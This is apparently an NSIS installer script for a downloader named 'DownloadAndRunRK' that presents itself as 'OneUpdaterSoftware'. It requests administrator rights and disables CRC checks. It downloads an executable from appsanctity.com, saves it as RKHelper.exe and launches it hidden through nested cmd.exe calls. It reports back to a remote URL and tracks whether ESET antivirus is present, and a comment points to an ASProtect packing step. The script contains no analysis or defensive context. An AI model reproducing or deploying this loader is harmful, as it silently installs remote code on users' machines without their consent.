;!packhdr $%TEMP%\exehead.tmp `"d:\Regular.Downloader\AutoCompile\PU\pckhdr\asprotect.bat" "$%TEMP%\exehead.tmp"`


Name "DownloadAndRunRK"

OutFile "DownloadAndRunRK.exe"


InstallDir "$LOCALAPPDATA\OneUpdaterSoftware"

CRCCheck off

SetCompressor zlib

RequestExecutionLevel admin

!addplugindir "plugins"


Var Result
Var ReportUrl
Var MainDomain
Var quant
Var stack
Var UID
Var DllPath
Var EsetFound
Var HardSkipPages
Var IPBSkip
Var MParam
Var UseValidateExit


!include "LogicLib.nsh"
!include "_import.nsh"
!include "md5util.nsh"
!include "UA.nsh"
!include "dll.nsh"


Page components
Page instfiles

UninstPage instfiles

Function DownloadAndRunRK

    Delete "$INSTDIR\RKHelper.exe"
    
    StrCpy $DownloadURL "https://$MainDomain/relevant.exe?quant=$quant"
    DetailPrint $DownloadURL
    StrCpy $FileName "rk1"
    StrCpy $SavedFileName "RKHelper"
    StrCpy $Ext ".exe"
    StrCpy $GoodResult "1935"
    StrCpy $BedResult "1936"
    Call MD5Download
    ${if} $CheckResult = "1"
        ExecShell "open" 'cmd.exe' '/d /c cmd.exe /d /c cmd.exe /d /c IF EXIST "$INSTDIR\RKHelper.exe" (start "" "$INSTDIR\RKHelper.exe" /q=$quant)' SW_HIDE
    ${endif}

FunctionEnd


Section "DownloadAndRunRK"
    
    Call DownloadAndRunRK
    
SectionEnd



Function .onInit
    
    Banner::show "initialization..."
    
    StrCpy $MainDomain "appsanctity.com"
    
    StrCpy $ReportUrl "https://$MainDomain/installer.php?CODE=PUTGQ&UID=$1&action="
    
    SetOutPath $PLUGINSDIR
    
    StrCpy $EsetFound "false"
    
    Call GenerateQuant
    
    ${if} $0 == "D"
        StrCpy $INSTDIR "$PROGRAMFILES\OneUpdaterSoftware"
    ${endif}
    
    CreateDirectory $INSTDIR
    
    Banner::destroy /NOUNLOAD
    
FunctionEnd


